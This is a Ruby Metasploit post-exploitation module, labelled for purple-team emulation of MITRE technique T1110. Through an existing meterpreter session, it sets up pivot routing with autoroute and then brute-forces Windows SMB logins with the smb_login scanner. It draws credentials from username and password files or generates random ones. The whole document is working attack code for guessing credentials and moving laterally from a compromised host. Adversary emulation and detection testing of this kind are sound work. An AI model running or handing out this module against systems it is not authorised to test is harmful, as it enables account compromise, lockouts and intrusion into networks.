##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Brute Force (T1110) Windows - Purple Team',
                      'Description'   => %q{
                        Credential Access:
                        Adversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1110' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new('SUBNET', [false, 'Subnet (IPv4, for example, 10.10.10.0)', nil]),
      OptString.new('NETMASK', [false, 'Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"', '255.255.255.0']),
      OptEnum.new('CMD', [true, 'Specify the autoroute command', 'autoadd', ['add','autoadd','print','delete','default']]),
      OptString.new('SMBPASS', [ false, 'A specific password to authenticate with (Default: random passwords)', nil ]),
      OptString.new('SMBUSER', [ false, 'A specific username to authenticate with (Default: random usernames)', nil ]),
      OptPath.new('USER_FILE', [ false, "File containing usernames, one per line" ]),
      OptPath.new('PASS_FILE', [ false, "File containing passwords, one per line" ]),
      OptString.new('SMBDOMAIN', [ true, 'Domain to bruteforce', 'WORKGROUP' ]),
      OptAddress.new('RHOST', [ false, 'Target address to bruteforce (default: IP for the session)', nil ])
    ])
  end

  def run_autoroute()
      framework_mod = framework.modules.create('post/multi/manage/autoroute')
      framework_mod.datastore['SESSION'] = datastore['SESSION']
      framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
      framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
      framework_mod.datastore['SUBNET'] = datastore['SUBNET']
      framework_mod.datastore['NETMASK'] = datastore["NETMASK"]
      framework_mod.datastore['CMD'] = datastore["CMD"]
      framework_mod.run_simple(
          'LocalInput' => self.user_input,
          'LocalOutput' => self.user_output,
          'Quiet' => false,
          'RunAsJob'  => false)
  end

  def run_smb_login()
      framework_mod = framework.modules.create('auxiliary/scanner/smb/smb_login')
      framework_mod.datastore['RHOSTS'] = datastore['RHOST']
      framework_mod.datastore['SMBDOMAIN'] = datastore['SMBDOMAIN']

      if datastore['USER_FILE']
        framework_mod.datastore['USER_FILE'] = datastore['USER_FILE']
      else
        framework_mod.datastore['SMBUSER'] = datastore['SMBUSER'] || (0...50).map { ('a'..'z').to_a[rand(26)] }.join.slice(0,8)
      end

      if datastore['PASS_FILE']
        framework_mod.datastore['PASS_FILE'] = datastore['PASS_FILE']
      else
        framework_mod.datastore['SMBPASS'] = datastore['SMBPASS'] || (0...50).map { ('a'..'z').to_a[rand(26)] }.join.slice(0,8)
      end

      framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
      framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
      framework_mod.run_simple(
          'LocalInput' => self.user_input,
          'LocalOutput' => self.user_output,
          'RunAsJob'  => false)
  end

  def run
    return 0 if session.type != "meterpreter"

    run_autoroute()
    select(nil, nil, nil, 3)
    mod = 'auxiliary/scanner/smb/smb_login'

    begin
        print_status("Executing '#{mod}' on #{session.inspect}")
        run_smb_login()
        print_good("Successful execution!")
    rescue ::Exception => e
        print_error("Unable to execute: #{e.message}")
        return
    end
  end
end
